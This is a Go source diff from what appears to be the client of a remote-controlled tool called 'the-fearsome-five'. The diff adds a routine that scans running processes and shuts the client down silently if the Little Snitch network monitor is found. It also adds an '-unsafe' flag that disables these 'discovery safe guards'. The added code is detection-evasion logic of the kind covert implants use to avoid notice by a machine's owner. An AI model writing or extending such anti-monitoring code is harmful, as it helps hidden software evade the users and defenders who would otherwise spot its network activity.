@@ -8,9 +8,11 @@ import (
 	"net/url"
 	"os"
 	"os/signal"
+	"strings"
 	"time"
 
 	"github.com/mikeflynn/the-fearsome-five/shared"
+	ps "github.com/mitchellh/go-ps"
 )
 
 var verbose *bool
@@ -31,9 +33,26 @@ func GetServer(server string) string {
 	return addr.String()
 }
 
+func processRunning(term string) bool {
+	procList, err := ps.Processes()
+	if err != nil {
+		Debug("Process list fetch failed.")
+		return false
+	}
+
+	for _, p := range procList {
+		if strings.Contains(p.Executable(), term) {
+			return true
+		}
+	}
+
+	return false
+}
+
 func main() {
 	server := flag.String("server", "localhost:8000", "Server hostname.")
 	verboseFlag := flag.Bool("verbose", false, "Additional debugging logs.")
+	unsafe := flag.Bool("unsafe", false, "Turn off all discovery safe guards.")
 
 	flag.Parse()
 
@@ -46,7 +65,8 @@ func main() {
 	system := InitSystem()
 
 	// Is it OK to run on this machine?
-	if false { // Fill in check for little snitch, etc.
+	if !*unsafe && processRunning("Little Snitch") {
+		Debug("Monitoring program found. Shutting down.")
 		os.Exit(0)
 	}
 
